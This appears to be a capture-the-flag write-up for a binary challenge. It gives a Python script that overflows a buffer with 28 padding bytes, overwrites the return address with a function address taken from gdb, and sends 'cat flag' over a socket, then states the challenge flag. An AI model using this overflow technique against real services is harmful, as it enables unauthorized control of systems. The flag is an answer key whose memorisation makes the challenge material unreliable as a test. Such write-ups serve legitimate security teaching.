### Challenge description

Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible? 

### Solution

We wrote a script to get the flag. Obtained the function address in `gdb`.

```python
import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument(
	"host",
	type=str,
	help="host ip",
)

parser.add_argument(
	"port",
	type=int,
	help="port ip",
)

args = parser.parse_args()

offset = 28
new_eip = struct.pack("<I", 0x080491f5)

payload = b"".join([
	b"A" * 28,
	new_eip
])

payload += b"\n"

with socket.socket() as connection:
	connection.connect((args.host,args.port))
	print(connection.recv(4096).decode("utf-8"))
	connection.send(payload)
	print(connection.recv(4096).decode("utf-8"))
	print(connection.recv(4096).decode("utf-8"))
	connection.send(b"cat flag\n")
	print(connection.recv(4096).decode("utf-8"))
```

flag{4cd3b4079393e861af489ca063373f98}